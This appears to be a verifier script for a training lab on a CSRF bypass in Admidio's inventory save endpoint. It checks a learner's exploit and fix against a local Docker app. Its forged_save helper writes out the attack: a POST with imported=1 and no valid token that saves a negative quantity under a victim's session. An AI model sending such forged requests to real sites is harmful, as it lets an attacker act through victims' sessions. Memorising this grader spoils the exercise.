#!/usr/bin/env python3
"""Verifier Lab 38: Admidio imported-flag CSRF bypass (CVE-2026-34383)."""

import os
import secrets
import subprocess
import sys
import time
from http.client import HTTPConnection
from urllib.parse import urlencode

LAB = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
HOST, PORT = "127.0.0.1", 8080
passed, failed = 0, 0


def check(name, cond, got=""):
    global passed, failed
    if cond:
        passed += 1
        print("  [LULUS] %s -- dapat %s" % (name, got))
    else:
        failed += 1
        print("  [GAGAL] %s -- dapat %s" % (name, got))


def sh(cmd):
    return subprocess.run(cmd, cwd=LAB, capture_output=True, text=True, timeout=300)


def req(method, path, body=None, cookie=None, headers=None, form=False):
    c = HTTPConnection(HOST, PORT, timeout=10)
    h = dict(headers or {})
    if cookie:
        h["Cookie"] = "session=" + cookie
    data = None
    if body is not None:
        if form:
            data = urlencode(body).encode()
            h["Content-Type"] = "application/x-www-form-urlencoded"
        else:
            import json as _j
            data = _j.dumps(body).encode()
            h["Content-Type"] = "application/json"
    c.request(method, path, body=data, headers=h)
    r = c.getresponse()
    raw = r.read()
    try:
        import json as _j
        resp = _j.loads(raw or b"{}")
    except Exception:
        resp = {}
    set_cookie = r.getheader("Set-Cookie", "")
    c.close()
    return r.status, resp, set_cookie


def sid_of(set_cookie):
    for part in set_cookie.split(";"):
        part = part.strip()
        if part.startswith("session="):
            return part[len("session="):]
    return ""


def wait_ready(timeout=90):
    t0 = time.time()
    while time.time() - t0 < timeout:
        try:
            s, _, _ = req("GET", "/")
            if s == 200:
                return True
        except Exception:
            pass
        time.sleep(2)
    return False


def login(username, password):
    s, d, raw = req("POST", "/login",
                    {"username": username, "password": password}, form=True)
    if s != 200:
        return "", {}
    return sid_of(raw), d


def parse_contract(out):
    d = {}
    for line in out.splitlines():
        if ":" in line:
            k, v = line.split(":", 1)
            d[k.strip()] = v.strip()
    return d


def run_exploit(path):
    p = subprocess.run([sys.executable, path], capture_output=True,
                       text=True, timeout=120)
    return p.returncode, p.stdout, p.stderr


def quantity_invalid(q):
    try:
        return int(q) < 0
    except (TypeError, ValueError):
        return True


def forged_save(victim_cookie, name, token=None):
    body = {"imported": "1", "name": name,
            "category": "electronics", "quantity": "-999"}
    if token is not None:
        body["csrf_token"] = token
    return req("POST", "/inventory/item_save", body,
               cookie=victim_cookie, form=True)


def inventory(cookie):
    s, d, _ = req("GET", "/inventory", cookie=cookie)
    return s, d.get("items", [])


def contract_ok(d, victim_cookie):
    if d.get("STATUS") != "200":
        return False, "STATUS=%r" % d.get("STATUS")
    try:
        iid = int(d.get("ITEM_ID", ""))
    except (TypeError, ValueError):
        return False, "ITEM_ID=%r" % d.get("ITEM_ID")
    s, items = inventory(victim_cookie)
    hit = [i for i in items if i["id"] == iid]
    if not hit:
        return False, "item %d tidak ada" % iid
    if quantity_invalid(hit[0]["quantity"]):
        return True, "item %d quantity=%r (invalid, bypass terbukti)" % (
            iid, hit[0]["quantity"])
    return False, "quantity valid: %r" % (hit[0]["quantity"],)


def fase1():
    print("== FASE 1: membangun lab PRISTINE (rentan) ==")
    sh(["docker", "compose", "down"])
    sh(["docker", "compose", "up", "--build", "-d"])
    print("menunggu lab siap di 127.0.0.1:8080 ...")
    if not wait_ready():
        check("lab siap", False, "timeout")
        return
    s, _, _ = req("GET", "/")
    check("baseline: GET / panel -> 200", s == 200, s)
    sid, _ = login("manager", "salah")
    check("baseline: login password salah -> 401", sid == "", repr(sid))
    victim, info = login("manager", "manager-pw")
    check("baseline: login manager -> sesi + csrf_token",
          bool(victim) and bool(info.get("csrf_token")),
          "sesi" if victim else "gagal")
    s, d, _ = req("GET", "/me", cookie=victim)
    check("baseline: /me -> 200", s == 200, s)
    s, items = inventory(victim)
    check("baseline: GET /inventory -> 200 kosong",
          s == 200 and items == [], items)
    c = HTTPConnection(HOST, PORT, timeout=10)
    c.request("GET", "/inventory/new", headers={"Cookie": "session=" + victim})
    r = c.getresponse()
    html = r.read().decode()
    c.close()
    check("baseline: GET /inventory/new memuat csrf_token",
          r.status == 200 and info.get("csrf_token", "") in html, r.status)
    s, _, _ = req("POST", "/inventory/item_save",
                  {"name": "a", "category": "electronics", "quantity": "1"},
                  cookie=victim, form=True)
    check("baseline: proteksi ADA: tanpa token -> 403", s == 403, s)
    s, _, _ = req("POST", "/inventory/item_save",
                  {"csrf_token": "salah", "name": "a",
                   "category": "electronics", "quantity": "1"},
                  cookie=victim, form=True)
    check("baseline: token salah -> 403", s == 403, s)
    s, _, _ = req("POST", "/inventory/item_save",
                  {"csrf_token": info.get("csrf_token", ""), "name": "a",
                   "category": "electronics", "quantity": "-5"},
                  cookie=victim, form=True)
    check("baseline: validasi ADA: quantity invalid -> 400", s == 400, s)
    legit = "legit" + secrets.token_hex(3)
    s, d, _ = req("POST", "/inventory/item_save",
                  {"csrf_token": info.get("csrf_token", ""), "name": legit,
                   "category": "furniture", "quantity": "3"},
                  cookie=victim, form=True)
    ok = s == 200 and d.get("id")
    check("baseline: token valid + field valid -> 200", ok, s)
    _, items = inventory(victim)
    hit = [i for i in items if i["name"] == legit]
    check("baseline: item tersimpan quantity int",
          hit and hit[0]["quantity"] == 3,
          hit[0]["quantity"] if hit else "hilang")

    print("== [HEALTH] serangan referensi: imported=1 tempaan ==")
    rc, out, err = run_exploit(os.path.join(LAB, "solutions", "exploit.py"))
    d = parse_contract(out)
    ok, got = contract_ok(d, victim) if rc == 0 else (False, "rc=%d" % rc)
    check("serangan referensi: kontrak STATUS/ITEM_ID + oracle", ok, got)

    print("== FASE 1: menjalankan exploit/exploit.py milik learner ==")
    p = os.path.join(LAB, "exploit", "exploit.py")
    try:
        src = open(p).read()
    except FileNotFoundError:
        src = ""
    if "NotImplementedError" in src:
        check("exploit: sudah dikerjakan (bukan scaffold)", False, "masih scaffold")
        return
    rc, out, err = run_exploit(p)
    d = parse_contract(out)
    check("exploit: STATUS 200", d.get("STATUS") == "200", repr(d.get("STATUS")))
    ok, got = contract_ok(d, victim) if rc == 0 else (False, "rc=%d" % rc)
    check("exploit: bypass terbukti via oracle (quantity invalid)", ok, got)


def fase2():
    print("== FASE 2: cek scaffold fix ==")
    pristine = open(os.path.join(LAB, "app", "app.py"), "rb").read()
    fixed = open(os.path.join(LAB, "fix", "app", "app.py"), "rb").read()
    check("fix: fix/app/app.py sudah diubah (tidak identik pristine)",
          pristine != fixed, "identik" if pristine == fixed else "berbeda")
    if pristine == fixed:
        return
    print("== FASE 2: membangun lab dengan FIX ==")
    sh(["docker", "compose", "-f", "docker-compose.yml",
        "-f", "docker-compose.fix.yml", "up", "--build", "-d"])
    print("menunggu lab siap di 127.0.0.1:8080 ...")
    if not wait_ready():
        check("lab siap", False, "timeout")
        return
    victim, info = login("manager", "manager-pw")
    check("fungsi normal: login -> sesi", bool(victim),
          "sesi" if victim else "gagal")
    evil = "evil" + secrets.token_hex(3)
    s, _, _ = forged_save(victim, evil)
    check("serangan GAGAL: imported=1 tanpa token -> 4xx",
          400 <= s < 500, s)
    s, _, _ = forged_save(victim, evil + "2", token="salah")
    check("serangan GAGAL: imported=1 token salah -> 4xx",
          400 <= s < 500, s)
    s, items = inventory(victim)
    bad = [i for i in items if quantity_invalid(i["quantity"])]
    check("serangan GAGAL: tidak ada item quantity-invalid", not bad, bad)
    legit = "legit" + secrets.token_hex(3)
    s, d, _ = req("POST", "/inventory/item_save",
                  {"csrf_token": info.get("csrf_token", ""), "name": legit,
                   "category": "stationery", "quantity": "7"},
                  cookie=victim, form=True)
    check("fungsi normal: token valid -> 200", s == 200, s)
    s, _, _ = req("POST", "/inventory/item_save",
                  {"csrf_token": info.get("csrf_token", ""), "name": "x",
                   "category": "electronics", "quantity": "-5"},
                  cookie=victim, form=True)
    check("fungsi normal: quantity invalid tetap -> 400", s == 400, s)
    s, d, _ = req("POST", "/inventory/item_save",
                  {"imported": "1", "csrf_token": info.get("csrf_token", ""),
                   "name": "impok", "category": "furniture",
                   "quantity": "2"},
                  cookie=victim, form=True)
    check("fungsi normal: imported=1 + token valid + field valid -> 200",
          s == 200, s)
    print("== FASE 2: menjalankan serangan referensi terhadap fix ==")
    rc, out, err = run_exploit(os.path.join(LAB, "solutions", "exploit.py"))
    d = parse_contract(out)
    ok, _ = contract_ok(d, victim)
    check("serangan referensi GAGAL total (tidak ada kontrak valid)",
          rc != 0 or not ok, "rc=%d" % rc)


if __name__ == "__main__":
    fase1()
    fase2()
    print("== HASIL: %d/%d cek lulus ==" % (passed, passed + failed))
    sh(["docker", "compose", "down"])
    sys.exit(0 if failed == 0 else 1)
